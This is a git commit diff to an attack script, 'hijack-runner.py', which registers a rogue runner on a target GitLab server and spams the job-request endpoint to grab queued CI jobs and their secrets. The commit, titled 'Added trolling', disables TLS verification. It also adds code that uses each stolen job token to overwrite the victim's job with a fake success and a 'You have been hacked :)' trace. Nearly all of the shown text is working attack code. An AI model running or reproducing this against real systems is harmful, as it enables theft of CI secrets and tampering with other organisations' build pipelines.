20062804d8a794cf9f50629621afbe648dc9f1fe
Nick Frichette <nick@frichetten.com>
2020-07-04 10:40:45 -0500

    Added trolling

--- hijack-runner.py
+++ hijack-runner.py
@@ -17,9 +17,10 @@ def register_runner(registration_token, gitlab_target):
     headers = { "Content-Type": "application/json" }
 
     response = requests.post(
-            "http://" + gitlab_target + "/api/v4/runners", 
+            gitlab_target + "/api/v4/runners", 
             data=REGISTRATION_JSON, 
-            headers=headers
+            headers=headers,
+            verify=False
     )
 
     token = json.loads(response.text)
@@ -32,17 +33,29 @@ def attack_runner(runner_token, gitlab_target):
 
     print("Going to start spamming. Gotta go fast...")
     finished = False
+    sess = requests.Session()
     while not finished:
-        response = requests.post(
-            "http://" + gitlab_target + "/api/v4/jobs/request",
+        response = sess.post(
+            gitlab_target + "/api/v4/jobs/request",
             data=RUNNER_JSON,
-            headers=headers
+            headers=headers,
+            verify=False
         )
 
         if response.status_code == 201:
             with open('grabbed_data.json','w') as w:
                 w.write(response.text)
             print(response.text)
+
+            ## Let's troll a little bit :)
+            data = json.loads(response.text)
+            id_num = data['id']
+            resp_token = data['token']
+            print("Stolen ID:", id_num)
+            TROLL_JSON = '{"info":{"name":"gitlab-runner","version":"11.2.0","revision":"11.2.0","platform":"linux","architecture":"amd64","executor":"shell","shell":"bash","features":{"variables":true,"image":false,"services":false,"artifacts":true,"cache":true,"shared":true,"upload_multiple_artifacts":true}},"token":"%s","state":"success","trace":"\\u001b[0KYou have been hacked :)\\n\\u001b[0;m"}' % resp_token
+            resp = sess.put(gitlab_target + "/api/v4/jobs/" + str(id_num), data=TROLL_JSON, headers=headers, verify=False)
+            print("Response code:", resp.status_code)
+
             exit()
 
 
